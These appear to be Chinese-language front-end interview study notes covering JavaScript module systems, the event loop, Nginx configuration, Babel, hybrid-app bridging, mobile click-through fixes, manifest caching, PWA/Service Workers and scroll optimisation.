* 对象写法

模块写成一个对象，模块成员都封装在对象里，通过调用对象属性，访问使用模块成员，但同时也暴露了模块成员，外部可以修改模块内部状态。

* 立即执行函数

外部无法访问内部私有变量

* ES6 旨在成为浏览器和服务器通用的模块解决方案。其模块功能主要由两个命令构成：export和import。export命令用于规定模块的对外接口，import命令用于输入其他模块提供的功能

ES6 模块与 CommonJS 模块的差异

* CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。
* CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。（运行时加载: CommonJS 模块就是对象；即在输入时是先加载整个模块，生成一个对象，然后再从这个对象上面读取方法，这种加载称为“运行时加载”。编译时加载: ES6 模块不是对象，而是通过 export 命令显式指定输出的代码，import时采用静态命令的形式。即在import时可以指定加载某个输出值，而不是加载整个模块，这种加载称为“编译时加载”。）

- CommonJS是服务器端模块的规范，由Node推广使用。由于服务端编程的复杂性，如果没有模块很难与操作系统及其他应用程序互动。

```javascript
math.js
exports.add = function() {
    var sum = 0, i = 0, args = arguments, l = args.length;
    while (i < l) {
      sum += args[i++];
    }
    return sum;
};
​
increment.js
var add = require('math').add;
exports.increment = function(val) {
    return add(val, 1);
};
​
index.js
var increment = require('increment').increment;
var a = increment(1); //2
根据CommonJS规范：
* 一个单独文件就是一个模块，每个模块都是一个单独的作用域，也就是说，在该模块内部定义的变量，无法被其他模块读取，除非定义为global对象的属性。
* 输出模块变量的最好方法是使用module.exports对象。
* 加载模块使用rquire方法，该方法读取一个文件并执行，返回文件内部的module.exports对象。
仔细看上面的代码，您会注意到 require 是同步的。模块系统需要同步读取模块文件内容，并编译执行以得到模块接口。
然而， 这在浏览器端问题多多。
浏览器端，加载 JavaScript 最佳、最容易的方式是在 document 中插入script标签。但脚本标签天生异步，传统 CommonJS 模块在浏览器环境中无法正常加载。
解决思路之一是，开发一个服务器端组件，对模块代码作静态分析，将模块与它的依赖列表一起返回给浏览器端。 这很好使，但需要服务器安装额外的组件，并因此要调整一系列底层架构。
```
* AMD：

AMD是"Asynchronous Module Definition"的缩写，意思就是"异步模块定义"。由于不是JavaScript原生支持，使用AMD规范进行页面开发需要用到对应的库函数，也就是大名鼎鼎RequireJS，实际上AMD 是 RequireJS 在推广过程中对模块定义的规范化的产出

它采用异步方式加载模块，模块的加载不影响它后面语句的运行。所有依赖这个模块的语句，都定义在一个回调函数中，等到加载完成之后，这个回调函数才会运行。

```javascript
RequireJS主要解决两个问题
* 多个js文件可能有依赖关系，被依赖的文件需要早于依赖它的文件加载到浏览器
* js加载的时候浏览器会停止页面渲染，加载文件越多，页面失去响应时间越长
RequireJs也采用require()语句加载模块，但是不同于CommonJS，它要求两个参数:
第一个参数[module]，是一个数组，里面的成员就是要加载的模块；第二个参数callback，则是加载成功之后的回调函数。math.add()与math模块加载不是同步的，浏览器不会发生假死。

require([module], callback);
​
require([increment'], function (increment) {
　   increment.add(1);
});
```
* CMD：

CMD 即Common Module Definition通用模块定义，CMD规范是国内发展出来的，就像AMD有个requireJS，CMD有个浏览器的实现SeaJS，SeaJS要解决的问题和requireJS一样，只不过在模块定义方式和模块加载（可以说运行、解析）时机上有所不同。

在 CMD 规范中，一个模块就是一个文件。代码的书写格式如下:

```javascript
define(function(require, exports, module) {
  // 模块代码
});
// CMD
define(function(require, exports, module) {
  var a = require('./a')
  a.doSomething()
  // 此处略去 100 行
  var b = require('./b') // 依赖可以就近书写
  b.doSomething()
  // ... 
})
​
// AMD 默认推荐的是
define(['./a', './b'], function(a, b) { // 依赖必须一开始就写好
  a.doSomething()
  // 此处略去 100 行
  b.doSomething()
  ...
})
```
### 
### 6.node / 浏览器中事件循环机制 Event Loop

js 的一大特点是单线程，而这个线程拥有唯一的一个事件循环。（新标准中的 web worker 涉及到多线程）。js 代码除了依靠函数调用栈确定函数的执行顺序外，还依靠任务队列确定另外一些代码的执行。

* 一个线程中，事件循环是唯一的，但是任务队列可以拥有多个。任务队列又分为 macro-task 宏任务， micro-task 微任务，在最新标准中它们分别被称为 task 和 jobs。
* macro-task 大概包括：script（整体代码），setTimeout, setInterval, setImmediate, I/O, UI rendering.
* micro-task 大概包括：process.nextTick, Promise, Object.observe(已废弃), MutationObserver(html5 新特性)
* setTimeout/Promise等我们称之为任务源。而进入任务队列的是他们指定的具体执行任务。
* 来自不同任务源的任务会进入到不同的任务队列。其中 setTimeout 与 setInterval 是同源的。
* 事件循环的顺序，决定了 JavaScript 代码的执行顺序。它从script(整体代码)开始第一次循环。之后全局上下文进入函数调用栈。直到调用栈清空(只剩全局)，然后执行所有的micro-task。当所有可执行的micro-task执行完毕之后。循环再次从macro-task开始，找到其中一个任务队列执行完毕，然后再执行所有的micro-task，这样一直循环下去。
* 其中每一个任务的执行，无论是macro-task还是micro-task，都是借助函数调用栈来完成。

**node 环境中的 EventLoop**

在进入第一次循环之前，会先进行如下操作：

同步任务；发出异步请求；规划定时器生效的时间；执行process.nextTick()。

循环中进行的操作：

* 清空当前循环内的 Timers Queue，清空 NextTick Queue，清空 Microtask Queue；（执行满足条件的 setTimeout 、setInterval 回调；）
* 清空当前循环内的 I/O Queue，清空 NextTick Queue，清空 Microtask Queue；（是否有已完成的 I/O 操作的回调函数，来自上一轮的 poll 残留）
* 清空当前循环内的 Check Queue，清空 NextTick Queue，清空 Microtask Queue；（执行 setImmediate 的回调）
* 清空当前循环内的 Close Queue，清空 NextTick Queue，清空 Microtask Queue；（关闭所有的 closing handles ，一些 onclose 事件）
* 进入下轮循环。

可以看出，nextTick 优先级比 Promise 等 microTask 高，setTimeout和setInterval优先级比setImmediate高。


****

### **7.mong**oDB

是一个面向集合的模式自由的文档型数据库

优势：

非关系型数据库，比关系型数据库快速；海量数据下，性能优越

很高的可拓展性，

存储格式 json 类型，能够更便捷的获取数据

缺点：

不支持事务操作，无法独立应用于大型应用中

占用空间过大，消耗内存

无法进行关联表查询

### 8 webpack 新特性

### 9 Nginx 做了什么，有什么好处

Nginx是一款轻量级的Web服务器、反向代理服务器，由于它的内存占用少，启动极快，高并发能力强，在互联网项目中广泛应用。

* **反向代理，解决跨域问题**
* **请求过滤**
```shell
# 状态码过滤
error_page 500 501 502 503 504 506 /50x.html; 
location = /50x.html { 
  #将跟路径改编为存放html的路径。 
  root /root/static/html; 
}
# 根据URL名称过滤
location / {
    rewrite  ^.*$ /index.html  redirect;
}
# 请求类型过滤
if ( $request_method !~ ^(GET|POST|HEAD)$ ) {
    return 403;
}
```
* **配置gzip,**请求头中 Content-Encoding: gzip
* **负载均衡**

负载均衡是高可用网络基础架构的关键组件，通常用于将工作负载分布到多个服务器来提高网站、应用、数据库或其他服务的性能和可靠性。

**如何实现的**

```shell
#Upstream指定后端服务器地址列表
upstream balanceServer {
    server 10.1.22.33:12345;
    server 10.1.22.34:12345;
    server 10.1.22.35:12345;
}
#在server中拦截响应请求，并将请求转发到Upstream中配置的服务器列表。
server { 
  server_name fe.server.com; 
  listen 80; 
  location /api { 
      proxy_pass http://balanceServer; 
  }
}
```
**负载均衡策略**

1. 轮询策略（默认）：将所有客户端请求轮询分配给服务端。这种策略是可以正常工作的，但是如果其中某一台服务器压力太大，出现延迟，会影响所有分配在这台服务器下的用户。
2. 最小连接数策略：将请求优先分配给压力较小的服务器，它可以平衡每个队列的长度，并避免向压力大的服务器添加更多的请求。
3. 权重策略：指定不同ip的权重，权重与访问比成正相关，权重越高，访问越大，适用于不同性能的机器。
4. 客户端ip绑定ip_hash：来自同一个ip的请求永远只分配一台服务器，有效解决了动态网页存在的session共享问题。
5. 最快响应时间策略fair（第三方）：会将请求优先分配给相应最快的服务器，这种方式需要依赖到第三方插件 nginx-upstream-fair
6. url_hash（第三方）:按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。
* **健康检查：**Nginx 自带 ngx_http_upstream_module（健康检测模块）本质上服务器心跳的检查，通过定期轮询向集群里的服务器发送健康检查请求,来检查集群中是否有服务器处于异常状态。如果检测出其中某台服务器异常,那么在通过客户端请求nginx反向代理进来的都不会被发送到该服务器上（直至下次轮训健康检查正常）。
* **静态资源服务器****：**匹配以png|gif|jpg|jpeg为结尾的请求，并将请求转发到本地路径，root中指定的路径即nginx本地路径。同时也可以进行一些缓存的设置。
* **访问权限控制**：可以配置 nginx 白名单，规定哪些ip可以访问服务器。
### 10 babel 插件相关

* babel  的 polyfill 和 runtime 的区别

**babel-polyfill：**Babel 默认只转换新的 JavaScript 语法，而不转换新的 API。例如，Iterator、Generator、Set、Maps、Proxy、Reflect、Symbol、Promise 等全局对象，以及一些定义在全局对象上的方法（比如 Object.assign）都不会转译。如果想使用这些新的对象和方法，必须使用 babel-polyfill，为当前环境提供一个垫片。

**babel-runtime：**Babel 转译后的代码要实现源代码同样的功能需要借助一些帮助函数，类似上面的帮助函数 _defineProperty 可能会重复出现在一些模块里，导致编译后的代码体积变大。Babel 为了解决这个问题，提供了单独的包 babel-runtime 供编译模块复用工具函数。

**transform-runtime**：transform-runtime & babel-runtime transform-runtime插件是把js代码中使用到的新原生对象和静态方法转换成对runtime实现包的引用，不会污染全局环境

### 11 常见的加密算法

* 对称加密， 加密解密使用相同算法： 常见的对称加密算法有DES、3DES、Blowfish、IDEA、RC4、RC5、RC6和AES
* 非对称加密 加密和解密使用不同密钥的加密算法， 也称为公私钥加密。常见的非对称加密算法有：RSA、ECC（移动设备用）、Diffie-Hellman、El Gamal、DSA（数字签名用）
* 哈希加密 不可还原的密码存储.常见的Hash算法有MD2、MD4、MD5、HAVAL、SHA
## 五.移动端

### 1.如何区别一个 App 是 Native App、Web App 还是 Hybrid App

什么叫做原生App? 原生App是专门针对某一类移动设备而生的，它们都是被直接安装到设备里，而用户一般也是通过网络商店或者卖场来获取例如 The App Store 与 Android Apps on Google Play . 随便说几个原生App的例子，比如iOS 的 Camera+ 以及Android 的 KeePassDroid

* **什么叫做移动Web App?**

一般说来，移动Web App都是都是需要用到网络的，它们利用设备上的浏览器(比如iPhone的Safari)来运行，而且它们不需要在设备上下载后安装。

* **什么是混合app?**

Hybrid App是指介于web-app、native-app这两者之间的app,它虽然看上去是一个Native App，但只有一个UI WebView，里面访问的是一个Web App，比如街旁网最开始的应用就是包了个客户端的壳，其实里面是HTML5的网页，后来才推出真正的原生应用。再彻底一点的，如掌上百度和淘宝客户端Android版，走的也是Hybrid App的路线，不过掌上百度里面封装的不是WebView，而是自己的浏览内核，所以体验上更像客户端，更高效。 综合一下就是：“Hybrid App同时使用网页语言与程序语言开发，通过应用商店区分移动操作系统分发，用户需要安装使用的移动应用”。总体特性更接近Native App但是和Web App区别较大。只是因为同时使用了网页语言编码，所以开发成本和难度比Native App要小很多。因此说，Hybrid App兼具了Native App的所有优势，也兼具了Web App使用HTML5跨平台开发低成本的优势。

**Web App**是指基于Web的系统和应用，运行在高端手机的网络和浏览器上，用网页技术开发实现特定功能的应用，对手机性能要求比较高。

**Native App**（原生开发）:目前较为成熟，各大公司均采用此方式。但是其人工成本较高，同一个项目，至少需要Android端、iOS端、Web端三个开发团队。

**Hybrid App**（混合开发），基于第三方跨平台移动应用引擎框架进行开发。使用HTML5和JS作为开发，调用引擎封装的底层功能如照相机、传感器、通讯录等。

**nativeapp**

是一个原生程序，一般运行在机器操作系统上，有很强的交互，一般静态资源都是在本地的。浏览使用方便，体验度高。在实现上要么使用Objecttive-c和cocoaTouch Framework撰写IOS程序，要么选择java+Android Framework撰写android应用程序。

**hybridapp**

是一个半原生程序，伪造了一个浏览器的apk/ipa原生程序，把地址写死了，然后里面运行了一个webapp。里面是WebView UI 。但是还是运行在机器的操作系统上，交互较弱，资源一般在本地或者网络都可以。浏览体验度次之。

webapp是生存在浏览器里的应用，所以只能运行在浏览器里，宿主是浏览器，不再是操作系统。资源一般都在网络上。说的根本点就是一个触屏版的网站。

### 2.hybrid 开发中的首屏优化手段，怎么处理优化的

大致思路：

* 预加载和创建：能提前做好准备的都提前做好准备
* 缓存：能缓存的都进行缓存
* 并行：能同时进行的尽量同时进行
* **前端优化**

在过去PC和手机浏览器中，已经有无数的优化手段，总结起来无外乎以下几点：



* 减少请求数量：合并资源，减少HTTP请求，懒加载，内联资源等
* 减少请求资源大小：压缩资源，gzip，webp图片，减少cookie等
* 提高请求速度：DNS预解析，资源预加载，CDN加速等
* 缓存：浏览器缓存，manifest缓存等
* 渲染：css、js加载顺序，同构直出等



几乎所有的应用最先遇到的性能瓶颈都是网络请求，所以能减少请求的缓存就显得比较重要。



浏览器的缓存机制这里就不做赘述，主要有通过设置`Cache-Control`等HTTP请求头的方式和PWA中利用Service Worker的方式。利用浏览器缓存机制，页面再次请求对应资源时，可以从缓存中获取，减少网络请求，而数据方面的请求，可以通过localStorage进行数据的缓存，首次渲染时可以使用本地缓存数据，然后再请求更新。

通过以上手段可以使页面第二次被访问时快速打开，但是第一次访问时，依旧存在慢的问题。

* 同构直出

首次访问需要加载js资源，然后再发起请求，等数据返回渲染后，用户才能看到。在上古年代，页面基本上都是通过服务端渲染的，页面返回时就已经带上了数据，减少了再次数据请求的过程。借助于nodejs，client端和server端使用同一套代码，可以通过node层进行数据和模版的组装，返回首屏的内容到浏览器渲染，达到“直出”，而首屏外的内容，可以用原来的方式，请求到js资源后再进行渲染，这样可以提高首屏的速度。

* 预置内联

此时，页面要渲染，除了数据，还需要等待样式文件的加载，那么这一块可以优化吗？



同构直出可以看作是数据内联到页面中，那么作为首屏的样式资源，其实也可以通过构建打包的流程，将其内联到页面中，那么当请求页面时，服务器返回的页面，就已经包含了首屏所需要的样式和数据，用户第一时间就可以看到页面，首屏外的样式资源，可以用原来的方式再去请求渲染。



此时，对于首屏，页面打开的流程缩减为：

初始化webview => 请求html => 解析首屏html、css => 渲染 => 下载图片 => 渲染 => 页面显示可交互

* 客户端优化

webview在启动前需要进行初始化，那么我们其实可以在webview加载页面之前就将它初始化完成，将其放入缓存池，之后直接从缓存池中获取预创建的webview，而非等到用户打开页面时再进行初始化。

* 离线包

之前的优化方式都是放在前端，数据源直接来源于服务端，在App中，我们是不是可以从APP中获取数据资源，在webview中无需任何请求，直接就是组装渲染？

对于非个性化页面，即所有用户所见相同的页面，每个版本用户所见内容相同，那么这一块内容其实可以打成一个资源包，这个资源包包含html、css、图片和js，客户端在某个时间点可以去预先请求这个资源包，之后用户打开这个页面时，客户端拦截对应的请求地址，从本地资源包找到对应的文件返回，同时客户端提供数据源，html获取到资源和数据后进行组装渲染。

离线包的方案涉及以下几个问题：



* 前端工程的打包构建流程：增量、全量打包，公共资源包
* 更新机制：增量更新和合并，全量更新
* 安全：离线包下发版本校验，防止篡改
* 客户端的资源拦截机制
* 回退方案：离线包下载失败，回退到同构直出方案

通过离线包的方案，在用户打开页面过程中，可以做到几乎无请求，达到秒开的效果。当然，结合几种方案，必然对前端工程的打包构建影响较大，需要设计好整个完成的打包构建方案。

### 3.hybrid 应用如何与原生应用进行交互通信

* jsBridge:

JsBridge给JavaScript提供了调用Native功能，Native也能够操控JavaScript。这样前端部分就可以方便使用地理位置、摄像头以及登录支付等Native能力啦。JSBridge构建 Native和非Native间消息通信的通道，而且是 双向通信的通道。

![图片](https://uploader.shimo.im/f/itERQvjIN7Hm46Bb.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

**拦截 URL SCHEME**具体为,可以用系统的OpenURI打开一个类似于url的链接(可拼入参数),然后系统会进行判断,如果是系统的url scheme,则打开系统应用,否则找看是否有app注册这种scheme,打开对应app .需要注意的是,这种scheme必须原生app注册后才会生效,如微信的scheme为(weixin://).

这种方式是Web端通过某种方式发送URLScheme请求，之后Native拦截到请求并根据URL SCHEME(包括所带的参数)进行相关操作。类似于通过SCHEME唤起APP。这种方式的缺点是url长度有隐患，并且创建请求需要一定的耗时，比注入API的方式调用同样的功能。耗时会比较长。所以还是推荐使用注入API的方式。

**设计出一个Native与JS交互的全局桥对象**

我们规定,JS和Native之间的通信必须通过一个H5全局对象JSbridge来实现

该对象有如下特点,该对象名为"JSBridge",是H5页面中全局对象window的一个属性;

该对象有如下方法`registerHandler( String,Function )`H5调用 注册本地JS方法,注册后Native可通过JSBridge调用。调用后会将方法注册到本地变量`messageHandlers`中;`callHandler( String,JSON,Function )`H5调用 调用原生开放的api,调用后实际上还是本地通过url scheme触发。调用时会将回调id存放到本地变量responseCallbacks中

;`_handleMessageFromNative( JSON )`Native调用 原生调用H5页面注册的方法,或者通知H5页面执行回调方法

**JS如何调用Native**通过特定的参数转换方法,将传入的数据,方法名一起,拼接成一个url scheme,使用内部早就创建好的一个隐藏iframe来触发scheme(注意,正常来说是可以通过window.location.href达到发起网络请求的效果的，但是有一个很严重的问题，就是如果我们连续多次修改window.location.href的值，在Native层只能接收到最后一次请求，前面的请求都会被忽略掉。所以JS端发起网络请求的时候，需要使用iframe，这样就可以避免这个问题。---引自参考来源)

向body中添加一个不可见的iframe元素。通过拦截url的方法来执行相应的操作，但是页面本身不能跳转，所以改变一个不可见的iframe的src就可以让webview拦截到url，而用户是无感知的。拦截url。通过shouldOverrideUrlLoading来拦截约定规则的Url，再做具体操作。Ps： 添加iframe是H5自身可实现的，但是如果H5来实现的话，需要每个页面实现，且耦合较高；因此放在库里，通过加载完成注入的方式，则会降低耦合

**Native如何得知api被调用**在Android中(WebViewClient里),通过shouldoverrideurlloading可以捕获到url scheme的触发.iOS中,UIWebView有个特性：在UIWebView内发起的所有网络请求，都可以通过delegate函数在Native层得到通知。这样,我们可以在webview中捕获url scheme的触发(原理是利用 shouldStartLoadWithRequest)

**分析url-参数和回调的格式**根据api名,在本地找寻对应的api方法,并且记录该方法执行完后的回调函数id;根据提取出来的参数,根据定义好的参数进行转化;原生本地执行对应的api功能方法;功能执行完毕后,找到这次api调用对应的回调函数id,然后连同需要传递的参数信息,组装成一个JSON格式的参数;通过JSBridge通知H5页面回调

### 4.移动端中常常出现的 click 点透现象

解决方法新：

* **禁用缩放**`<meta name = "viewport" content="user-scalable=no" >`缺点: 网页无法缩放。
* **更改默认视口宽度**`<meta name="viewport" content="width=device-width">`缺点: 需要浏览器的支持
* **css touch-action**touch-action的默为 auto，将其置为 none 即可移除目标元素的 300 毫秒延迟 缺点: 新属性，可能存在浏览器兼容问题
* **fastclick**原理: 在检测到touchend事件的时候，会通过DOM自定义事件立即出发模拟一个click事件，并把浏览器在300ms之后真正的click事件阻止掉 缺点: 脚本相对较大

**原因**： click 的延迟

1.touchstart：在这个DOM（或冒泡到这个DOM）上手指触摸开始即能立即触发

2.click：在这个DOM（或冒泡到这个DOM）上手指触摸开始，且手指未曾在屏幕上移动（某些浏览器允许移动一个非常小的位移值），且在这个在这个dom上手指离开屏幕，且触摸和离开屏幕之间的间隔时间较短（某些浏览器不检测间隔时间，也会触发click）才能触发

也就是说，事件的触发时间按由早到晚排列为：touchstart 早于 touchend 早于 click。亦即click的触发是有延迟的，这个时间大概在300ms左右。

**出现的场景**：

1. A/B 两个层上下 z 轴重叠。
2. 上层的 A 点击后消失或移开。
3. B 元素本身有默认的 click 事件（如 a 标签）或 B 绑定了 click 事件。

在以上情况下，点击 A/B 重叠部分就会出现点透现象。

**解决方案**：

1. 统一使用 touch 事件，统一代码风格，关于触摸事件应尽量使用 touch相关事件。
2. 对于B 元素本身存在默认 click 事件的情况下，应及时取消 A 元素的默认点击事件，从而阻止 click 事件的产生。 preventDefault(）
3. 对于遮罩浮层，由于遮罩浮层的点击即使有小延迟也是没有关系的，反而会有疑似更好的用户体验，所以这种情况，可以针对遮盖浮层自己采用click事件，这样就不会出现点透问题。
4. 用touchend代替tap事件并阻止掉touchend的默认行为preventDefault()
5. 延迟一定的时间(300ms+)来处理事件

**现有解决方案框架**：

1. 众所周知，zepto的tap事件是有点透问题的，但是最新版的zepto已经修复了这个问题。

2. 在zepto修复问题之前，有fastclick、hammer等通用库可以使用。

然后fastclick处理比较与zepto基本一致，但是又有所不同

Fastclick 与 Zepto

1. fastclick是将事件绑定到你传的元素（一般是document.body）
2. 在touchstart和touchend后（会手动获取当前点击el），如果是类click事件便手动触发了dom元素的click事件

所以click事件在touchend便被触发，整个响应速度就起来了，触发实际与zepto tap一样

好了，为什么基本相同的代码，zepto会点透而fastclick不会呢？

原因是zepto的代码里面有个settimeout，而就算在这个代码里面执行e.preventDefault()也不会有用

这就是根本区别，因为settimeout会将优先级较低

有了定期器，当代码执行到setTimeout的时候， 就会把这个代码放到JS的引擎的最后面

而我们代码会马上检测到e.preventDefault，一旦加入settimeout，e.preventDefault便不会生效，这是zepto点透的根本原因

### 5.h5 缓存

Manifest 是 H5提供的一种应用缓存机制, 基于它web应用可以实现离线访问(offline cache). 为此, 浏览器还提供了应用缓存的api--applicationCache. 虽然manifest的技术已被web标准废弃, 但这不影响我们尝试去了解它. 也正是因为manifest的应用缓存机制如此诱人, 饿了么 和 office 365邮箱都还在使用着它!

鉴于manifest应用缓存的技术, 我们可以做到:

* 离线访问: 即使服务器挂了, 或者没有网络, 用户依然可以正常浏览网页内容.
* 访问更快: 数据存在于本地, 省去了浏览器发起http请求的时间, 因此访问更快, 移动端效果更为明显.
* 降低负载: 浏览器只在manifest文件改动时才去服务器下载需要缓存的资源, 大大降低了服务器负载. manifest缓存的过程如下(来自网络):

**manifest缓存清单**

就像写作文一样, manifest采用经典的三段式. 分别为: CACHE, NETWORK 和 FALLBACK. 如下, 先看一个栗子

其中第一行必须以 CACHE MANIFEST 开头, 后可跟若干字符注释, 注释从#号开始. 跟在 CACHE MANIFEST 行后的文件, 每行列出一个, 这些文件是需要缓存的文件. 因此 content.css 会被缓存, 不需要访问网络.

第二段内容以 NETWORK: 开始, 跟在该行后的文件表示需要访问网络. 如: app.js 将直接从网络上下载, 并不走manifest cache, 如果除了第一段中缓存的文件以外, 其他文件都从网络上获取, 那么此时可将 app.js 改为 * (通配符).

第三段内容以 FALLBACK: 开始, 跟在该行后的文件表示会有一个替代方案. 如: 当访问 /other 路径时, 如果访问失败, 那么将自动加载 404.html 作为替代.

manifest缓存状态

每个manifest缓存都有一个状态, 标示着缓存的情况. 一份缓存清单只有一个缓存状态, 即使它被多个页面引用. 以下是各个缓存状态:

* UNCACHED(未缓存): 表明应用缓存对象还没有初始化完成.
* IDLE(空闲): 应用缓存并未处于更新状态.
* CHECKING(检查): 正在检查是否存在更新.
* DOWNLOADING(下载): 清单更新后, 重新下载全部资源到临时缓存中.
* UPDATEREADY(更新就绪): 新版本的缓存下载完成, 全部就绪, 随即触发事件 updateready.
* OBSOLETE(废弃): 应用缓存已被废弃. 上述缓存状态常量依次取值0, 1, 2, 3, 4, 5.

manifest缓存独立性

1. manifest的缓存和浏览器默认的缓存是两套机制, 相互独立, 并且不受浏览器缓存大小限制(Chrome下测试结果).
2. 各个manifest文件的缓存相互独立, 各自在独立的区域进行缓存. 即使是缓存同一个文件, 也可能由于缓存的版本不一致, 而造成各个页面资源不一致. manifest缓存规则
3. 遵循全量缓存的规律. 即: manifest文件改动后, 将重新缓存一遍所有的文件(包括html本身和动态添加的需要缓存的文件,即使缓存列表中没有该html). 第一次缓存过程中如果出现缓存失败的文件, 那么, 第二访问, 又将重新缓存一遍所有的文件. 以此类推.
4. manifest文件本身不能写进缓存清单, 否则连同html和资源在其缓存失效之前, 将永远不能获得更新.
5. 即使manifest文件丢失, 缓存依然有效. 不过从此以后, 引入该manifest的html, 将永远不能获得更新.
### 6.PWA 的理解

Progressive Web App, 简称 PWA，是提升 Web App 的体验的一种新方法，能给用户原生应用的体验。

PWA 能做到原生应用的体验不是靠特指某一项技术，而是经过应用一些新技术进行改进，在安全、性能和体验三个方面都有很大提升，PWA 本质上是 Web App，借助一些新技术也具备了 Native App 的一些特性，兼具 Web App 和 Native App 的优点。

PWA 的主要特点包括下面三点：

* 可靠 - 即使在不稳定的网络环境下，也能瞬间加载并展现
* 体验 - 快速响应，并且有平滑的动画响应用户的操作
* 粘性 - 像设备上的原生应用，具有沉浸式的用户体验，用户可以添加到桌面

可靠

当用户打开我们站点时（从桌面 icon 或者从浏览器），通过 Service Worker 能够让用户在网络条件很差的情况下也能瞬间加载并且展现。

Service Worker 是用 JavaScript 编写的 JS 文件，能够代理请求，并且能够操作浏览器缓存，通过将缓存的内容直接返回，让请求能够瞬间完成。开发者可以预存储关键文件，可以淘汰过期的文件等等，给用户提供可靠的体验。

体验

如果站点加载时间超过 3s，53% 的用户会放弃等待。页面展现之后，用户期望有平滑的体验，过渡动画和快速响应。

为了保证首屏的加载，我们需要从设计上考虑，在内容请求完成之前，可以优先保证 App Shell 的渲染，做到和 Native App 一样的体验，App Shell 是 PWA 界面展现所需的最小资源。

粘性

* PWA 是可以安装的，用户点击安装到桌面后，会在桌面创建一个 PWA 应用，并且不需要从应用商店下载
* PWA 可以借助 Web App Manifest 提供给用户和 Native App 一样的沉浸式体验
* PWA 可以通过给用户发送离线通知，让用户回流 Web App Manifest 允许开发者控制 PWA 添加到桌面，允许定制桌面图标、URL等等。

1.什么是 Service Worker

浏览器中的 javaScript 都是运行在一个单一主线程上的，在同一时间内只能做一件事情。随着 Web 业务不断复杂，我们逐渐在 js 中加了很多耗资源、耗时间的复杂运算过程，这些过程导致的性能问题在 WebApp 的复杂化过程中更加凸显出来。

这个时候有个叫 Web Worker 的 API 被造出来了，这个 API 的唯一目的就是解放主线程，Web Worker 是脱离在主线程之外的，将一些复杂的耗时的活交给它干，完成后通过 postMessage 方法告诉主线程，而主线程通过 onMessage 方法得到 Web Worker 的结果反馈。

一切问题好像是解决了，但 Web Worker 是临时的，我们能不能有一个东东是一直持久存在的，并且随时准备接受主线程的命令呢？基于这样的需求推出了最初版本的 Service Worker ，Service Worker 在 Web Worker 的基础上加上了持久离线缓存能力。

Service Worker 有以下功能和特性：

* 一个独立的 worker 线程，独立于当前网页进程，有自己独立的 worker context。
* 一旦被 install，就永远存在，除非被 uninstall
* 需要的时候可以直接唤醒，不需要的时候自动睡眠（有效利用资源，此处有坑）
* 可编程拦截代理请求和返回，缓存文件，缓存的文件可以被网页进程取到（包括网络离线状态）
* 离线内容开发者可控
* 能向客户端推送消息
* 不能直接操作 DOM
* 出于安全的考虑，必须在 HTTPS 环境下才能工作
* 异步实现，内部大都是通过 Promise 实现

service worker的运行周期

图中可以看到，一个service worker要经历以下过程：

1. 安装
2. 激活，激活成功之后，打开chrome://inspect/#service-workers可以查看到当前运行的service worker
3. 监听fetch和message事件，下面两种事件会进行简要描述
4. 销毁，是否销毁由浏览器决定，如果一个service worker长期不使用或者机器内存有限，则可能会销毁这个worker fetch事件 在页面发起http请求时，service worker可以通过fetch事件拦截请求，并且给出自己的响应。在前端开发中通过fetch事件拦截请求是很基本的技术。 w3c提供了一个新的fetch api，用于取代XMLHttpRequest，与XMLHttpRequest最大不同有两点：
    1. fetch()方法返回的是Promise对象，通过then方法进行连续调用，减少嵌套。ES6的Promise在成为标准之后，会越来越方便开发人员。
        1. 提供了Request、Response对象，如果做过后端开发，对Request、Response应该比较熟悉。前端要发起请求可以通过url发起，也可以使用Request对象发起，而且Request可以复用。但是Response用在哪里呢？在service worker出现之前，前端确实不会自己给自己发消息，但是有了service worker，就可以在拦截请求之后根据需要发回自己的响应，对页面而言，这个普通的请求结果并没有区别，这是Response的一处应用。  message事件 页面和serviceWorker之间可以通过posetMessage()方法发送消息，发送的消息可以通过message事件接收到。这是一个双向的过程，页面可以发消息给service worker，service worker也可以发送消息给页面，由于这个特性，可以将service worker作为中间纽带，使得一个域名或者子域名下的多个页面可以自由通信。 service workder缓存文件 只有通过service workder缓过得文件，只要你访问过一次，下一次均可实现离线访问，再也不会404了。

2、优化实践

* Service worker 的应用： html/css 文件缓存（cache-storage）、拦截404响应并返回自定义 page（拦截默认请求动作并进行自定义动作）
* Manifest.json的配置： 自定义启动样式、图标、主题颜色及样式、应用名字
* offline-first的设计：（弱网络或无网络提供访问及性能优化：主要避免online-first 应用中弱网络下长时间的请求以及白屏的不好体验。） online 且处于弱网络中 -> 方式：html/css/js 文件缓存，当 url 问 index 时，首先加载 html 缓存文件。所以整个过程中应用汇首先加载本地缓存，之后再发起 http 请求加载，如果 http 请求失败可让 js 控制返回提示信息。效果可以避免长时间白屏，可默认显示无内容的 html 文档。
* IndexDB：网络中的数据填充，将 data 数据存储到 idb 中，可以是无网络下也能拿到 data数据
* 使用默认的 default 图片，解决弱网络中的图片无法加载的问题。或者缓存必要图片，提供显示。
* 弱网络中发送请求缓慢的解决或无网络中无法发送出请求，background sync. 即采用异步请求发送的策略，把请求放入异步的等待队列中，可等待网络正常时将请求发出。
### 7、高性能滚动 scroll 及页面渲染优化

在绑定 scroll 、resize 这类事件时，当它发生时，它被触发的频次非常高，间隔很近。如果事件中涉及到大量的位置计算、DOM 操作、元素重绘等工作且这些工作无法在下一个 scroll 事件触发前完成，就会造成浏览器掉帧。加之用户鼠标滚动往往是连续的，就会持续触发 scroll 事件导致掉帧扩大、浏览器 CPU 使用率增加、用户体验受到影响。

在滚动事件中绑定回调应用场景也非常多，在图片的懒加载、下滑自动加载数据、侧边浮动导航栏等中有着广泛的应用。当用户浏览网页时，拥有平滑滚动经常是被忽视但却是用户体验中至关重要的部分。当滚动表现正常时，用户就会感觉应用十分流畅，令人愉悦，反之，笨重不自然卡顿的滚动，则会给用户带来极大不舒爽的感觉。

**方案：**

1.防抖（**Debouncing**）和节流（**Throttling**）

* 防抖动：防抖技术即是可以把多个顺序地调用合并成一次，也就是在一定时间内，规定事件被触发的次数。
* 节流函数：只允许一个函数在 X 毫秒内执行一次，只有当上一次函数执行后过了你规定的时间间隔，才能进行下一次该函数的调用。

2.使用**rAF**（**requestAnimationFrame**）触发滚动事件

如果页面只需要兼容高版本浏览器或应用在移动端，又或者页面需要追求高精度的效果，那么可以使用浏览器的原生方法 rAF（requestAnimationFrame）。

